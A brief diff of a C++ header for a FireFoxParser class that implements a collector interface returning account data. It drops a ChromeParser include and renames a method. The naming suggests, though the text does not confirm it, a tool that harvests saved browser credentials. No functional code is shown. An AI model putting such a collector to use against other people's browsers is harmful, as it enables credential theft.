@@ -1,5 +1,4 @@
 ﻿#pragma once
-#include "ChromeParser.h"
 #include "cJson.h"
 #include "Forwards.h"
 #include "ICollector.h"
@@ -13,7 +12,7 @@ public:
 	~FireFoxParser() override = default;
 public:
 
-	List<AccountData> collect_data() override;
+	List<AccountData> collectData() override;
 
 private:	
 	
